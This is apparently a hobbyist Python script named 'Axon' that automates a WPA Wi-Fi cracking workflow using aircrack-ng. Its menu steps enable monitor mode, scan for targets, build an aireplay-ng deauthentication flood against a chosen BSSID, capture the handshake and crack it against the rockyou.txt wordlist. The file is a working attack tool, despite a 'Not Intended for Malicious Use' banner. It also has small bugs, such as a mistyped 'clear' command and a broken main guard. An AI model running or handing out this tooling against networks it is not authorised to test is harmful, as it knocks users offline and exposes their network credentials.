import os
import time
from threading import Thread


def menu():
    print(logo)
    print(options)
    return


def checklist():
    os.system("lear")
    print("Preparing your Environment for Axon...")
    os.system("sudo apt-get update && sudo apt-get upgrade")
    time.sleep(2)
    os.system("sudo apt-get install aircrack-ng")
    time.sleep(2)
    os.system("sudo airmon-ng check kill")
    time.sleep(2)
    os.system("clear")
    print("Preparation Complete")
    return


def adapter():
    iwconfig = os.system("iwconfig")
    print(iwconfig)
    global wifi
    wifi = input("Input Desired Adapter:")
    os.system("sudo airmon-ng start " + wifi)
    return


def scan():
    print("Press Ctrl+C once your desired network appears\n"
          "\n"
          "\n")
    time.sleep(1)
    print("Displaying Networks in 3...")
    time.sleep(1)
    print("...2...")
    time.sleep(1)
    print("...1...")
    time.sleep(1)
    os.system("sudo airodump-ng " + wifi)
    print("Input the following information:\n")
    global bssid
    bssid = input("Target BSSID:")
    global ch
    ch = input("Target Channel:")
    return


def capture():
    print("Once a message appears at the top that reads 'Handshake Captured' press Ctrl+C")
    time.sleep(3)
    command = str("sudo aireplay-ng --deauth 0 -a" + str(bssid) + " " + wifi)
    print("Open a new terminal and typ the following" + command)
    time.sleep(3)
    print("Scan will begin in 3...")
    time.sleep(1)
    print("...2...")
    time.sleep(1)
    print("...1...")
    time.sleep(1)
    os.system("airodump-ng -w " + str(bssid) + " -c " + str(ch) + " --bssid " + str(bssid) + " " + wifi)
    time.sleep(2)
    os.system("clear")
    time.sleep(2)
    return

## Couldn't make the deauth automatic
'''
def deauth():
    os.system("sudo aireplay-ng --deauth 0 -a" + str(bssid) + " " + wifi)
    print("Deauthing")
    return


if __name__ == '__axon__':
    Thread(target=deauth).start()
    Thread(target=capture).start()
'''


def dencrypt():
    print("Decryption will now be attempted!")
    os.system("sudo aircrack-ng " + bssid + "-01.cap -w rockyou.txt")
    return


logo = "         _           _      _              _            _          \n" \
       "        / /\       /_/\    /\ \           /\ \         /\ \     _  \n" \
       "       / /  \      \ \ \   \ \_\         /  \ \       /  \ \   /\_\ \n" \
       "      / / /\ \      \ \ \__/ / /        / /\ \ \     / /\ \ \_/ / /\n" \
       "     / / /\ \ \      \ \__ \/_/        / / /\ \ \   / / /\ \___/ / \n" \
       "    / / /  \ \ \      \/_/\__/\       / / /  \ \_\ / / /  \/____/  \n" \
       "   / / /___/ /\ \      _/\/__\ \     / / /   / / // / /    / / /   \n" \
       "  / / /_____/ /\ \    / _/_/\ \ \   / / /   / / // / /    / / /    \n" \
       " / /_________/\ \ \  / / /   \ \ \ / / /___/ / // / /    / / /     \n" \
       "/ / /_       __\ \_\/ / /    /_/ // / /____\/ // / /    / / /      \n" \
       "\_\___\     /____/_/\/_/     \_\/ \/_________/ \/_/     \/_/       \n" \
       "\n" \
       "Created by Axon\n" \
       "Not Intended for Malicious Use\n"

options = "------------------------------------------------------------------\n" \
          "Menu\n" \
          "1. Prepare the Environment\n" \
          "2. Set Desired Wireless Adapter\n" \
          "3. Scan Nearby Networks\n" \
          "4. Attempt to Capture Handshake\n" \
          "5. Decrypt the Handshake\n" \
          "6. Exit\n"

menu()
decision = input("Select a Number (1-6):")

while decision != "6":
    if decision == "1":
        checklist()
    elif decision == "2":
        adapter()
    elif decision == "3":
        scan()
    elif decision == "4":
        capture()
    elif decision == "5":
        dencrypt()
    else:
        print("Invalid Input")

    print()
    menu()
    decision = input("Select a Number (1-6):")

print("Thanks for trying my program! Goodbye.")
